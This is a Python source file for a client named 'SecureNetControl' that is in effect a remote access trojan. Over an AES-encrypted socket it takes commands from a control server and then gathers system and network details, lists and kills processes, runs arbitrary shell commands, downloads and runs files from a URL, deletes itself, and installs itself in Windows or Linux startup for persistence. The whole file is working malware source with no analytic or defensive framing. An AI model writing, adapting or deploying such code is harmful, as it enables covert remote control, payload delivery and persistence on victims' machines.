import platform
import psutil
import socket
import subprocess
import requests
import os
import sys
import shutil
import time
import threading
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Encryption key (must be 16, 24, or 32 bytes long)
ENCRYPTION_KEY = b'Sixteen byte key'  # Replace with a strong, randomly generated key

def encrypt(data):
    cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC)
    ct_bytes = cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
    iv = base64.b64encode(cipher.iv).decode('utf-8')
    ct = base64.b64encode(ct_bytes).decode('utf-8')
    return iv, ct

def decrypt(iv, ciphertext):
    try:
        iv = base64.b64decode(iv)
        ct = base64.b64decode(ciphertext)
        cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv=iv)
        pt = unpad(cipher.decrypt(ct), AES.block_size)
        return pt.decode('utf-8')
    except Exception as e:
        print(f"Decryption error: {e}")
        return None

def get_system_info():
    """Gathers and returns system information."""
    try:
        info = {}
        info["platform"] = platform.system()
        info["platform-release"] = platform.release()
        info["platform-version"] = platform.version()
        info["architecture"] = platform.machine()
        info["hostname"] = socket.gethostname()
        info["ip-address"] = socket.gethostbyname(socket.gethostname())
        info["mac-address"] = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5,-1,-1)]) if (uuid := __import__('uuid')) else "N/A" #Requires uuid
        info["processor"] = platform.processor()
        info["ram"] = str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB"
        return info
    except Exception as e:
        return {"error": str(e)}

def get_network_info():
    """Gathers and returns network information."""
    try:
        net_info = {}
        for interface, addresses in psutil.net_if_addrs().items():
            net_info[interface] = []
            for address in addresses:
                net_info[interface].append(str(address))
        return net_info
    except Exception as e:
        return {"error": str(e)}

def list_processes():
    """Lists currently running processes."""
    try:
        processes = []
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            processes.append(proc.info)
        return processes
    except Exception as e:
        return {"error": str(e)}

def kill_process(pid):
    """Kills a process given its PID."""
    try:
        pid = int(pid)
        proc = psutil.Process(pid)
        proc.kill()
        return f"Process with PID {pid} killed successfully."
    except psutil.NoSuchProcess:
        return f"No process found with PID {pid}."
    except Exception as e:
        return f"Error killing process: {str(e)}"

def execute_command(command):
    """Executes a system command and returns the output."""
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, check=False)
        return {"stdout": result.stdout, "stderr": result.stderr, "returncode": result.returncode}
    except Exception as e:
        return {"error": str(e)}

def download_and_execute(url):
    """Downloads a file from a URL and executes it."""
    try:
        response = requests.get(url, stream=True)
        response.raise_for_status()  # Raise an exception for bad status codes

        file_name = url.split("/")[-1]
        file_path = os.path.join(os.getcwd(), file_name)

        with open(file_path, "wb") as file:
            for chunk in response.iter_content(chunk_size=8192):
                file.write(chunk)

        # Make the file executable (if necessary)
        try:
            os.chmod(file_path, 0o755)  # Adjust permissions as needed
        except OSError as e:
            print(f"Warning: Could not set execute permissions: {e}")

        # Execute the downloaded file
        try:
            subprocess.Popen([file_path]) # Run in background, non-blocking
            return f"Downloaded and executed {file_name} successfully."
        except Exception as e:
             return f"Error executing {file_name}: {str(e)}"


    except requests.exceptions.RequestException as e:
        return f"Error downloading file: {str(e)}"
    except Exception as e:
        return f"General error: {str(e)}"

def self_delete():
    """Deletes the current script file."""
    try:
        if sys.platform.startswith('win'):
             subprocess.run(f'del /f "{os.path.abspath(sys.argv[0])}"', shell=True, check=False, creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            os.remove(os.path.abspath(sys.argv[0]))
        return "Self-deleted successfully."
    except Exception as e:
        return f"Error self-deleting: {str(e)}"

def add_to_startup():
    """Adds the script to the startup folder for persistence."""
    try:
        if sys.platform.startswith('win'):
            startup_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            script_path = os.path.abspath(sys.argv[0])
            file_name = os.path.basename(script_path)
            startup_file = os.path.join(startup_path, file_name + ".lnk")
            #Create shortcut using powershell (avoids dependency)
            powershell_command = f'$ws = New-Object -ComObject WScript.Shell ; $shortcut = $ws.CreateShortcut("{startup_file}") ; $shortcut.TargetPath = "{script_path}" ; $shortcut.Save()'
            subprocess.run(['powershell', '-Command', powershell_command], check=True, capture_output=True)
            return "Added to startup successfully."

        else:  # Linux (using .desktop file)
            config_dir = os.path.expanduser("~/.config")
            autostart_dir = os.path.join(config_dir, "autostart")
            if not os.path.exists(autostart_dir):
                os.makedirs(autostart_dir)
            script_path = os.path.abspath(sys.argv[0])
            desktop_file_path = os.path.join(autostart_dir, "my_script.desktop")  # Use a consistent name
            desktop_file_content = f"""
[Desktop Entry]
Type=Application
Name=MyScript
Exec={script_path}
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
"""
            with open(desktop_file_path, "w") as f:
                f.write(desktop_file_content)
            return "Added to startup successfully (Linux)."


    except Exception as e:
        return f"Error adding to startup: {str(e)}"

def handle_command(command, data):
    """Handles different commands received from the server."""
    try:
        if command == "get_system_info":
            return get_system_info()
        elif command == "get_network_info":
            return get_network_info()
        elif command == "list_processes":
            return list_processes()
        elif command == "kill_process":
            return kill_process(data)
        elif command == "execute_command":
            return execute_command(data)
        elif command == "download_and_execute":
            return download_and_execute(data)
        elif command == "self_delete":
            return self_delete()
        elif command == "add_to_startup":
            return add_to_startup()
        else:
            return {"error": "Unknown command"}
    except Exception as e:
        return {"error": str(e)}


def client_connect(server_address, server_port):
    """Connects to the server and listens for commands."""
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((server_address, server_port))
            print(f"Connected to {server_address}:{server_port}")

            while True:
                try:
                    encrypted_message = client_socket.recv(1024).decode('utf-8')
                    if not encrypted_message:
                        break  # Server disconnected

                    iv, ciphertext = encrypted_message.split("||", 1)
                    decrypted_message = decrypt(iv, ciphertext)

                    if not decrypted_message:
                        print("Decryption failed. Check encryption key.")
                        continue


                    command, data = decrypted_message.split("||", 1)

                    result = handle_command(command, data)
                    iv, encrypted_result = encrypt(str(result))

                    client_socket.send(f"{iv}||{encrypted_result}".encode('utf-8'))



                except ConnectionResetError:
                    print("Connection to server was reset.")
                    break
                except ValueError as e:
                   print(f"Error processing message (possible decryption error): {e}")
                   break #Potentially exit inner loop if the format is consistently bad

        except socket.error as e:
            print(f"Socket error: {e}.  Retrying in 5 seconds...")
            time.sleep(5)
        except Exception as e:
            print(f"An unexpected error occurred: {e}. Retrying in 5 seconds...")
            time.sleep(5)
        finally:
            if 'client_socket' in locals():
                client_socket.close()
            time.sleep(5) # Delay before reconnecting


def SecureNetControl(server_address="127.0.0.1", server_port=12345):
    """Main function to start the client."""
    print("Starting SecureNetControl client...")
    client_connect(server_address, server_port)


if __name__ == "__main__":
    SecureNetControl()
